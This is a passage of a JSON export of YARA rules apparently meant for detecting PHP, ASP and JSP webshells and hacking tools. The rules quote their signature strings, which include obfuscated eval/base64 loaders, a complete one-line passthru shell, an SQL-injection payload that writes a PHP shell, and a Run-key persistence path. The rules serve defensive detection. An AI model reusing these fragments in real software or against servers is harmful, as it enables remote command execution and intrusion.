CryptCreateHash!\" \n      $s5 = \"A new key container has been created.\" \n      $s6 = \"The password has been added to the hash. \" \n   condition: \n      all of them\n}","date":"2014-04-07 09:10:01","description":"Webshells Auto-generated - file HDConfig.exe","minimum_yara":"1.7","name":"HKTL_HDConfig_RID2B85","reference":"-","required_modules":[],"rule_hash":"72d6e0b6a8ddb1948bc12412590df151","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule WebShell_b374k_mini_shell_php_php_RID33C2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file b374k-mini-shell-php.php.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 15:01:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@error_reporting(0);\" fullword\n      $s2 = \"@eval(gzinflate(base64_decode($code)));\" fullword\n      $s3 = \"@set_time_limit(0); \" fullword\n   condition: \n      all of them\n}","date":"2014-04-06 15:01:31","description":"PHP Webshells Github Archive - file b374k-mini-shell-php.php.php","minimum_yara":"1.7","name":"WebShell_b374k_mini_shell_php_php_RID33C2","reference":"-","required_modules":[],"rule_hash":"a2cdb2889f1ba26d1f46531ee38cd61e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_hiddens_shell_v1_RID30E2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file hiddens shell v1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:58:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U\" \n   condition: \n      all of them\n}","date":"2014-04-06 12:58:51","description":"PHP Webshells Github Archive - file hiddens shell v1.php","minimum_yara":"1.7","name":"WebShell_hiddens_shell_v1_RID30E2","reference":"-","required_modules":[],"rule_hash":"904ca614620ebfae9c69cf603a7315c3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_Uploader_RID2DC2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Uploader.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"move_uploaded_file($userfile, \\\"entrika.php\\\"); \" fullword\n   condition: \n      all of them\n}","date":"2014-04-06 10:45:31","description":"PHP Webshells Github Archive - file Uploader.php","minimum_yara":"1.7","name":"WebShell_Uploader_RID2DC2","reference":"-","required_modules":[],"rule_hash":"d567d030234c75006a180c809b0e7471","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_php_webshells_README_RID3203 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file README.md\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Common php webshells. Do not host the file(s) in your server!\" fullword\n      $s1 = \"php-webshells\" fullword\n   condition: \n      all of them\n}","date":"2014-04-06 13:47:01","description":"PHP Webshells Github Archive - file README.md","minimum_yara":"1.7","name":"WebShell_php_webshells_README_RID3203","reference":"-","required_modules":[],"rule_hash":"2b3d89c532ee7cdd3c52d24c76307479","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_accept_language_RID3099 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file accept_language.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php passthru(getenv(\\\"HTTP_ACCEPT_LANGUAGE\\\")); echo '<br> by q1w2e3r4'; ?>\" fullword\n   condition: \n      all of them\n}","date":"2014-04-06 12:46:41","description":"PHP Webshells Github Archive - file accept_language.php","minimum_yara":"1.7","name":"WebShell_accept_language_RID3099","reference":"-","required_modules":[],"rule_hash":"809e525f0e08cbfd15afdf79079c6300","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_mysql_tool_RID2ED9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file mysql_tool.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s12 = \"$dump .= \\\"-- Dumping data for table '$table'\\\\n\\\";\" fullword\n      $s20 = \"$dump .= \\\"CREATE TABLE $table (\\\\n\\\";\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 11:32:01","description":"PHP Webshells Github Archive - file mysql_tool.php","minimum_yara":"1.7","name":"WebShell_mysql_tool_RID2ED9","reference":"-","required_modules":[],"rule_hash":"8778953a48f28f952d7cb94dcc007683","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_php_webshells_lolipop_RID3354 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file lolipop.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:43:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$commander = $_POST['commander']; \" fullword\n      $s9 = \"$sourcego = $_POST['sourcego']; \" fullword\n      $s20 = \"$result = mysql_query($loli12) or die (mysql_error()); \" fullword\n   condition: \n      all of them\n}","date":"2014-04-06 14:43:11","description":"PHP Webshells Github Archive - file lolipop.php","minimum_yara":"1.7","name":"WebShell_php_webshells_lolipop_RID3354","reference":"-","required_modules":[],"rule_hash":"6cd0d1d725030ab165708b6a7b75ee02","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_toolaspshell_RID2FA0 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file toolaspshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cprthtml = \\\"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef\" \n      $s1 = \"barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\\\"\\\\\\\")) - 1\" fullword\n      $s2 = \"destino3 = folderItem.path & \\\"\\\\index.asp\\\"\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 12:05:11","description":"PHP Webshells Github Archive - file toolaspshell.php","minimum_yara":"1.7","name":"WebShell_toolaspshell_RID2FA0","reference":"-","required_modules":[],"rule_hash":"1d0385ed447cab331a35f487514b869d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_Sincap_1_0_RID2E03 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Sincap 1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"</font></span><a href=\\\"mailto:shopen@aventgrup.net\\\">\" fullword\n      $s5 = \"<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B\" fullword\n      $s9 = \"</span>Avrasya Veri ve NetWork Teknolojileri Geli\" fullword\n      $s12 = \"while (($ekinci=readdir ($sedat))){\" fullword\n      $s19 = \"$deger2= \\\"$ich[$tampon4]\\\";\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 10:56:21","description":"PHP Webshells Github Archive - file Sincap 1.0.php","minimum_yara":"1.7","name":"WebShell_Sincap_1_0_RID2E03","reference":"-","required_modules":[],"rule_hash":"83c694f5da63c5486c202db37324f3d3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_HYTop_DevPack_fso_RID311E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file fso.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- PageFSO Below -->\" \n      $s1 = \"theFile.writeLine(\\\"<script language=\\\"\\\"vbscript\\\"\\\" runat=server>if request(\\\"\\\"\\\"&cli\" \n   condition: \n      all of them\n}","date":"2014-04-06 13:08:51","description":"Webshells Auto-generated - file fso.asp","minimum_yara":"1.7","name":"Webshell_HYTop_DevPack_fso_RID311E","reference":"-","required_modules":[],"rule_hash":"c6d14d695629fc4346190b4a7f4cea5a","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FeliksPack3___PHP_Shells_ssh_RID3532 : DEMO T1021 T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ssh.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 16:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1021, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(gzinflate(str_rot13(base64_decode('\" \n   condition: \n      all of them\n}","date":"2014-04-06 16:02:51","description":"Webshells Auto-generated - file ssh.php","minimum_yara":"1.7","name":"Webshell_FeliksPack3___PHP_Shells_ssh_RID3532","reference":"-","required_modules":[],"rule_hash":"979639d65983314f87bd93c6ec299d0d","score":75,"tags":["T1100","DEMO","WEBSHELL","T1021"]},{"author":"Florian Roth","content":"rule MAL_Debug_BDoor_RID2C66 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file BDoor.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\BDoor\\\\\" \n      $s4 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" \n   condition: \n      all of them\n}","date":"2014-04-06 09:47:31","description":"Webshells Auto-generated - file BDoor.dll","minimum_yara":"1.7","name":"MAL_Debug_BDoor_RID2C66","reference":"-","required_modules":[],"rule_hash":"3a8188f48535d9f046ccd9ae585b94b8","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule ZXshell2_0_rar_Folder_ZXshell_RID3224 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ZXshell.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:52:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WPreviewPagesn\" \n      $s1 = \"DA!OLUTELY N\" \n   condition: \n      all of them\n}","date":"2014-04-06 13:52:31","description":"Webshells Auto-generated - file ZXshell.exe","minimum_yara":"1.7","name":"ZXshell2_0_rar_Folder_ZXshell_RID3224","reference":"-","required_modules":[],"rule_hash":"f842fc3bed421692fcdb9240353220e5","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_b374k_php_RID2D98 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file b374k.php.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"// encrypt your password to md5 here http://kerinci.net/?x=decode\" fullword\n      $s6 = \"// password (default is: b374k)\" \n      $s8 = \"//******************************************************************************\" \n      $s9 = \"// b374k 2.2\" fullword\n      $s10 = \"eval(\\\"?>\\\".gzinflate(base64_decode(\" \n   condition: \n      3 of them\n}","date":"2014-04-06 10:38:31","description":"PHP Webshells Github Archive - file b374k.php.php","minimum_yara":"1.7","name":"WebShell_b374k_php_RID2D98","reference":"-","required_modules":[],"rule_hash":"38ace66cba2c59b06706f34d57ea8b62","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_h4ntu_shell__powered_by_tsoi__RID365B : DEMO T1033 T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 16:52:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1033, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s11 = \"<title>h4ntu shell [powered by tsoi]</title>\" fullword\n      $s13 = \"$cmd = $_POST['cmd'];\" fullword\n      $s16 = \"$uname = posix_uname( );\" fullword\n      $s17 = \"if(!$whoami)$whoami=exec(\\\"whoami\\\");\" fullword\n      $s18 = \"echo \\\"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>\" \n      $s20 = \"ob_end_clean();\" fullword\n   condition: \n      3 of them\n}","date":"2014-04-06 16:52:21","description":"PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php","minimum_yara":"1.7","name":"WebShell_h4ntu_shell__powered_by_tsoi__RID365B","reference":"-","required_modules":[],"rule_hash":"eb36987be4d8b57d33f1f07272c56563","score":75,"tags":["T1100","DEMO","T1033","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_php_webshells_MyShell_RID3313 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file MyShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<title>MyShell error - Access Denied</title>\" fullword\n      $s4 = \"$adminEmail = \\\"youremail@yourserver.com\\\";\" fullword\n      $s5 = \"//A workdir has been asked for - we chdir to that dir.\" fullword\n      $s6 = \"system($command . \\\" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o\" \n      $s13 = \"#$autoErrorTrap Enable automatic error traping if command returns error.\" fullword\n      $s14 = \"/* No work_dir - we chdir to $DOCUMENT_ROOT */\" fullword\n      $s19 = \"#every command you excecute.\" fullword\n      $s20 = \"<form name=\\\"shell\\\" method=\\\"post\\\">\" fullword\n   condition: \n      3 of them\n}","date":"2014-04-06 14:32:21","description":"PHP Webshells Github Archive - file MyShell.php","minimum_yara":"1.7","name":"WebShell_php_webshells_MyShell_RID3313","reference":"-","required_modules":[],"rule_hash":"8f3efa58eb587d80a878fff506c3c5f5","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_php_webshells_pHpINJ_RID325E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file pHpINJ.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:02:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';\" fullword\n      $s10 = \"<form action = \\\"<?php echo \\\"$_SERVER[PHP_SELF]\\\" ; ?>\\\" method = \\\"post\\\">\" fullword\n      $s11 = \"$sql = \\\"0' UNION SELECT '0' , '<? system(\\\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN\" \n      $s13 = \"Full server path to a writable file which will contain the Php Shell <br />\" fullword\n      $s14 = \"$expurl= $url.\\\"?id=\\\".$sql ;\" fullword\n      $s15 = \"<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />\" fullword\n      $s16 = \"<input type = \\\"submit\\\" value = \\\"Create Exploit\\\"> <br /> <br />\" fullword\n   condition: \n      1 of them\n}","date":"2014-04-06 14:02:11","description":"PHP Webshells Github Archive - file pHpINJ.php","minimum_yara":"1.7","name":"WebShell_php_webshells_pHpINJ_RID325E","reference":"-","required_modules":[],"rule_hash":"b323af8124302e78b974dc47649f3c7f","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_ru24_post_sh_RID2F32 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file ru24_post_sh.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://www.ru24-team.net\" fullword\n      $s4 = \"if ((!$_POST['cmd']) || ($_POST['cmd']==\\\"\\\")) { $_POST['cmd']=\\\"id;pwd;uname -a\" \n      $s6 = \"Ru24PostWebShell\" \n      $s7 = \"Writed by DreAmeRz\" fullword\n      $s9 = \"$function=passthru; // system, exec, cmd\" fullword\n   condition: \n      1 of them\n}","date":"2014-04-06 11:46:51","description":"PHP Webshells Github Archive - file ru24_post_sh.php","minimum_yara":"1.7","name":"WebShell_ru24_post_sh_RID2F32","reference":"-","required_modules":[],"rule_hash":"1c83448f7ceb20eb5ceb4380c97899d6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule thelast_orice2_RID2CA9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file orice2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:58:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \" $aa = $_GET['aa'];\" \n      $s1 = \"echo $aa;\" \n   condition: \n      all of them\n}","date":"2014-04-06 09:58:41","description":"Webshells Auto-generated - file orice2.php","minimum_yara":"1.7","name":"thelast_orice2_RID2CA9","reference":"-","required_modules":[],"rule_hash":"eb7b29485f01ae1f0c9ab2bc696d91c5","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule FSO_s_sincap_RID2BA8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file sincap.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"    <font color=\\\"#E5E5E5\\\" style=\\\"font-size: 8pt; font-weight: 700\\\" face=\\\"Arial\\\">\" \n      $s4 = \"<body text=\\\"#008000\\\" bgcolor=\\\"#808080\\\" topmargin=\\\"0\\\" leftmargin=\\\"0\\\" rightmargin=\" \n   condition: \n      all of them\n}","date":"2014-04-06 09:15:51","description":"Webshells Auto-generated - file sincap.php","minimum_yara":"1.7","name":"FSO_s_sincap_RID2BA8","reference":"-","required_modules":[],"rule_hash":"08779eabb953b4e451ac88323ec43c5e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PhpShell_1_RID2E56 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PhpShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"href=\\\"http://www.gimpster.com/wiki/PhpShell\\\">www.gimpster.com/wiki/PhpShell</a>.\" \n   condition: \n      all of them\n}","date":"2014-04-06 11:10:11","description":"Webshells Auto-generated - file PhpShell.php","minimum_yara":"1.7","name":"Webshell_PhpShell_1_RID2E56","reference":"-","required_modules":[],"rule_hash":"f30ab4dfe629f32a644b8dc1272147ad","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_c99_locus7s_RID2E8A : DEMO T1087 T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file c99_locus7s.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"$encoded = base64_encode(file_get_contents($d.$f)); \" fullword\n      $s9 = \"$file = $tmpdir.\\\"dump_\\\".getenv(\\\"SERVER_NAME\\\").\\\"_\\\".$db.\\\"_\\\".date(\\\"d-m-Y\" \n      $s10 = \"else {$tmp = htmlspecialchars(\\\"./dump_\\\".getenv(\\\"SERVER_NAME\\\").\\\"_\\\".$sq\" \n      $s11 = \"$c99sh_sourcesurl = \\\"http://locus7s.com/\\\"; //Sources-server \" fullword\n      $s19 = \"$nixpwdperpage = 100; // Get first N lines from /etc/passwd \" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 11:18:51","description":"PHP Webshells Github Archive - file c99_locus7s.php","minimum_yara":"1.7","name":"WebShell_c99_locus7s_RID2E8A","reference":"-","required_modules":[],"rule_hash":"2fb4ad77e1be74a0738112ce661bbac4","score":75,"tags":["T1100","DEMO","WEBSHELL","T1087"]},{"author":"Florian Roth","content":"rule WebShell_JspWebshell_1_2_RID300A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file JspWebshell_1.2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:22:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"System.out.println(\\\"CreateAndDeleteFolder is error:\\\"+ex); \" fullword\n      $s1 = \"String password=request.getParameter(\\\"password\\\");\" fullword\n      $s3 = \"<%@ page contentType=\\\"text/html; charset=GBK\\\" language=\\\"java\\\" import=\\\"java.\" \n      $s7 = \"String editfile=request.getParameter(\\\"editfile\\\");\" fullword\n      $s8 = \"//String tempfilename=request.getParameter(\\\"file\\\");\" fullword\n      $s12 = \"password = (String)session.getAttribute(\\\"password\\\");\" fullword\n   condition: \n      3 of them\n}","date":"2014-04-06 12:22:51","description":"PHP Webshells Github Archive - file JspWebshell_1.2.php","minimum_yara":"1.7","name":"WebShell_JspWebshell_1_2_RID300A","reference":"-","required_modules":[],"rule_hash":"ce4660802786bb793007dad924ea0d44","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_cgitelnet_RID2E45 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file cgitelnet.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:07:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"# Author Homepage: http://www.rohitab.com/\" fullword\n      $s10 = \"elsif($Action eq \\\"command\\\") # user wants to run a command\" fullword\n      $s18 = \"# in a command line on Windows NT.\" fullword\n      $s20 = \"print \\\"Transfered $TargetFileSize Bytes.<br>\\\";\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 11:07:21","description":"PHP Webshells Github Archive - file cgitelnet.php","minimum_yara":"1.7","name":"WebShell_cgitelnet_RID2E45","reference":"-","required_modules":[],"rule_hash":"bdbbd0abf9d6bcac2fe1c7194e1f7c1c","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_lamashell_RID2E39 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file lamashell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(($_POST['exe']) == \\\"Execute\\\") {\" fullword\n      $s8 = \"$curcmd = $_POST['king'];\" fullword\n      $s16 = \"\\\"http://www.w3.org/TR/html4/loose.dtd\\\">\" fullword\n      $s18 = \"<title>lama's'hell v. 3.0</title>\" fullword\n      $s19 = \"_|_  O    _    O  _|_\" fullword\n      $s20 = \"$curcmd = \\\"ls -lah\\\";\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 11:05:21","description":"PHP Webshells Github Archive - file lamashell.php","minimum_yara":"1.7","name":"WebShell_lamashell_RID2E39","reference":"-","required_modules":[],"rule_hash":"fc5b92ea89fd906ecb012e342bb0f104","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version_RID3A6D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 19:46:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"- AK-74 Security Team Web Site: www.ak74-team.net\" fullword\n      $s9 = \"<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.\" \n      $s10 = \"<b><font color=#83000>Execute system commands!</font></b>\" fullword\n   condition: \n      1 of them\n}","date":"2014-04-06 19:46:01","description":"PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php","minimum_yara":"1.7","name":"WebShell_AK_74_Security_Team_Web_Shell_Beta_Version_RID3A6D","reference":"-","required_modules":[],"rule_hash":"50104da4f2517412997e248744a69114","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_HYTop_DevPack_config_RID324C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file config.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"const adminPassword=\\\"\" \n      $s2 = \"const userPassword=\\\"\" \n      $s3 = \"const 